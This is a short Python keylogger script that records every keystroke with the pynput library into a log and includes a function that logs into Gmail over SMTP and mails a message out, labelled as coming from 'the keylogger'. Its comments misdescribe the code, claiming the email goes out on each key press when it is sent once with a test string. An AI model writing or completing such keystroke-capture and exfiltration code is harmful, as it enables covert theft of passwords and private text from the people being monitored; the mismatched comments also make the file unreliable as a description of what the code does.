import pynput  
import smtplib      
log=""
# creating a global variable to store the log
def on_press(key):
    global log
    
    # Attempt to handle key presses more gracefully
    # This will handle both regular keys and special keys like space
    # and will avoid errors if the key does not have a char attribute
    # This is useful for keys like Shift, Ctrl, etc.
    
    try:
        log += str(key.char)      
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += ' '
        else:
            log += str(key) 
    except:
        pass
    print(log)

def  send_email(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
send_email("user@gmail.com","your_password","This is a test message from the keylogger.")
# This function sends an email with the key log.
# It uses SMTP to connect to Gmail's server and send the email.
# This function is called whenever a key is pressed, appending the key to the log and printing it.
key_listener = pynput.keyboard.Listener(on_press=on_press)
# This sets up a listener for keyboard events, calling on_press when a key is pressed.
with key_listener:
    key_listener.join()
# This script listens for keyboard events and prints "key" whenever a key is pressed.
